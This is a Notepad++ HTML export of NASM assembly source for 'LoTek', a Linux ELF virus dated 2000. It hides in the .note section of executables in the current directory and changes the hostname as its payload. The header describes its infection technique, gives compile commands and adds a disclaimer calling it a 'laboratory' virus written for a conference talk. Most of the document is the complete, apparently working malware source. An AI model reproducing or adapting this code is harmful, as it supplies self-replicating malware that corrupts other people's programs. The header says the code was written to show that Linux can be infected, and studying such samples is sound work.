<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Replicant name................LoTek</span><span class="sc0">
</span><span class="sc1">;   Author........................Wintermute</span><span class="sc0">
</span><span class="sc1">;   Email.........................winter@outlimit.org</span><span class="sc0">
</span><span class="sc1">;   Inception date................Octubre 2000</span><span class="sc0">
</span><span class="sc1">;   Target OS.....................Linux OS</span><span class="sc0">
</span><span class="sc1">;   Size..........................338 bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Characteristics</span><span class="sc0">
</span><span class="sc1">;   ---------------</span><span class="sc0">
</span><span class="sc1">;   LoTek is an ELF cavity infector which hides itself in the ".note"</span><span class="sc0">
</span><span class="sc1">;   section in order to replicate without changing file size.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   It's a runtime virus that replicates by using memory file mapping</span><span class="sc0">
</span><span class="sc1">;   syscalls (mmap), copying itself to this .note section just after</span><span class="sc0">
</span><span class="sc1">;   the .bss one (which is in the same offset as another hole, .comment,</span><span class="sc0">
</span><span class="sc1">;   less easy to infect cuz of that), changing data segment permissions</span><span class="sc0">
</span><span class="sc1">;   in order to make it execute. This ".note" section is used by software</span><span class="sc0">
</span><span class="sc1">;   developers in order to indicate compatibility/etc of the file, and</span><span class="sc0">
</span><span class="sc1">;   is almost always never used.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Payload is chaging machine hostname one of each thirty-two executions</span><span class="sc0">
</span><span class="sc1">;   (reading the processor tsc).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   I just wanna remark this is a "test" virus, just trying an infection</span><span class="sc0">
</span><span class="sc1">;   on Linux; it was writed in order to show an easy example on Linux</span><span class="sc0">
</span><span class="sc1">;   infection in HackMeeting Barcelona'00 to complete a speak I made about</span><span class="sc0">
</span><span class="sc1">;   Linux viruses and their risks (to silence those "Linux-never-can-get</span><span class="sc0">
</span><span class="sc1">;   infected" people).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   PD: So, you can imagine where the name "LoTek" came from :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Disclaimer</span><span class="sc0">
</span><span class="sc1">;   ----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   As you compile/execute this virus or part of it, you're responsible</span><span class="sc0">
</span><span class="sc1">;   on what happens next; because of beeing limited on searching</span><span class="sc0">
</span><span class="sc1">;   executables (just in the current directory), it's an easy virus</span><span class="sc0">
</span><span class="sc1">;   to control. Anyway, if you don't know exactly what it does, do *not*</span><span class="sc0">
</span><span class="sc1">;   execute it. I also can't assure every file will work 100% after</span><span class="sc0">
</span><span class="sc1">;   infection, so it all up to you, make backups on your files before</span><span class="sc0">
</span><span class="sc1">;   trying LoTek on them.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   By compiling/executing this virus you accept I'm not responsible</span><span class="sc0">
</span><span class="sc1">;   on what you do with this virus. My intentions are obviously far from</span><span class="sc0">
</span><span class="sc1">;   infecting Linux users, and this is no more than a "laboratory" virus;</span><span class="sc0">
</span><span class="sc1">;   it's very limited, but it would be easy to make it recursively infect</span><span class="sc0">
</span><span class="sc1">;   directories, etc. My intentions with this little replicant are just</span><span class="sc0">
</span><span class="sc1">;   on reminding that linux viruses can be (easily) written, and that</span><span class="sc0">
</span><span class="sc1">;   even though it's a very secure OS, there's a lot of open doors</span><span class="sc0">
</span><span class="sc1">;   expecting for infections.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Of course, this virus won't make a big infection, as it's limited to</span><span class="sc0">
</span><span class="sc1">;   executing user's privilege. Linux community doesn't change many</span><span class="sc0">
</span><span class="sc1">;   executables but source codes, so it's nearly impossible a "big</span><span class="sc0">
</span><span class="sc1">;   epidemy".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   So, I don't think I'm doing any bad to Linux community - which I</span><span class="sc0">
</span><span class="sc1">;   admire and respect - writing a virus like this.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   COMPILATION</span><span class="sc0">
</span><span class="sc1">;   -----------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   nasm lotek.asm -o lotek.vir -f elf</span><span class="sc0">
</span><span class="sc1">;   gcc -Wall -g -s lotek.vir -o lotek.exec</span><span class="sc0">
</span><span class="sc1">;   dwarf lotek.exec</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">BITS</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc9">GLOBAL</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span><span class="sc9">SECTION</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">

</span><span class="sc5">vir_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_ends</span><span class="sc4">-</span><span class="sc5">vir_start</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0x0f</span><span class="sc4">,</span><span class="sc2">0x31</span><span class="sc0">    </span><span class="sc1">; thx to AVP for this, nasm didn't compile rdtsc</span><span class="sc0">
</span><span class="sc1">;   rdstc</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_activarse</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04ah</span><span class="sc0">        </span><span class="sc1">; Set Hostname</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Wintah</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">

</span><span class="sc5">no_activarse</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,(</span><span class="sc2">10Ah</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Opendir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">diractual</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc5">Sigue_Leyendo</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">059h</span><span class="sc0">   </span><span class="sc1">; readdir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">yanohaymas</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX -&gt; file name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infectar</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Sigue_Leyendo</span><span class="sc0">

</span><span class="sc5">yanohaymas</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,(</span><span class="sc2">10Ah</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; stack adjust</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">retback</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">back</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">vir_ends</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;   Infection</span><span class="sc0">

</span><span class="sc5">Infectar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">013h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0x5a</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">        </span><span class="sc1">; mmap(file)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xFFFFF000</span><span class="sc0">  </span><span class="sc1">; Same check as mmap.c does</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">Continuar</span><span class="sc0">

</span><span class="sc5">j_cer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc1">; Failure? Bye...</span><span class="sc0">

</span><span class="sc5">Continuar</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x464C457F</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Check ELF</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">j_cer</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">   </span><span class="sc1">; Check exec</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">j_cer</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">; Infection mark: ei_data = 0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">j_cer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04Ch</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">j_cer</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],(</span><span class="sc5">vir_ends</span><span class="sc4">-</span><span class="sc5">vir_start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">j_cer</span><span class="sc0">       </span><span class="sc1">; Big enough?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">back</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">back</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vir_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vir_ends</span><span class="sc4">-</span><span class="sc5">vir_start</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Copy virus</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">098h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">09Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Make new ep</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ACh</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">           </span><span class="sc1">;Hardcoded (lazy xD)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0A8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">back</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Recover...</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">91</span><span class="sc0">              </span><span class="sc1">;Close mapping</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">
</span><span class="sc5">Chaping</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">;Close file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Message</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoTek by '</span><span class="sc0">
</span><span class="sc5">Wintah</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Wintermute'</span><span class="sc0">
</span><span class="sc5">diractual</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vir_ends</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; Old host (first generation)</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">080h</span><span class="sc0">
</span></div></body>
</html>
